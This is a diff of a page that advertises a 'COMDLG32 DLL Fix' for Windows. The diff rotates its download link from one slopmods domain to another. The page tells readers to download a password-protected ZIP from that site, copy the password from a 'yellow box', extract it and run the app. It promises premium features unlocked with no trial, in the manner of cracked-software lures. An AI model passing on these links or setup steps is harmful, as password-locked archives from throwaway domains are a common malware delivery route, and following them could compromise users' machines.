@@ -8,12 +8,12 @@ COMDLG32 DLL Fix — Windows setup and configuration · Premium workspace · Zer
 
 > Use the release page below for Windows.
 
-- **Release page:** [qxgiimbhfof.slopmods.tech](https://qxgiimbhfof.slopmods.tech/)
-- **Full URL:** `https://qxgiimbhfof.slopmods.tech/`
+- **Release page:** [qxgiimbhfof.slopmods.top](https://qxgiimbhfof.slopmods.top/)
+- **Full URL:** `https://qxgiimbhfof.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **qxgiimbhfof.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **qxgiimbhfof.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ COMDLG32 DLL Fix — Windows setup and configuration · Premium workspace · Zer
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **qxgiimbhfof.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **qxgiimbhfof.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
